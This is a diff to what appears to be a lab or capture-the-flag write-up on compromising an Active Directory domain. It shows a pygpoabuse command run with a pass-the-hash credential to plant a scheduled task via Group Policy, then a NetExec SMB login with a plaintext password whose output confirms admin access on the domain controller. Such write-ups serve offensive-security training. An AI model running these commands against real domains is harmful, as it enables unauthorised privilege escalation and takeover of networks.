@@ -1280,7 +1280,18 @@ python3 pygpoabuse.py 'ctos.corp'/'it_ops_lead' -hashes ':fd8bd0720fec58d0b50052
 
 Ill create a scheduled task
 
+Then ill wait a minute or two for it to update and run the task
+
+```python
+nxc smb dc01.ctos.corp -u john -p 'H4x00r123..'                            
+SMB         10.1.201.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.201.146    445    DC01             [+] CTOS.CORP\john:H4x00r123.. (Pwn3d!)
+```
+
+As seen here i am now an Admin on the domain controller
+
 ```python
 
 ```
+
 
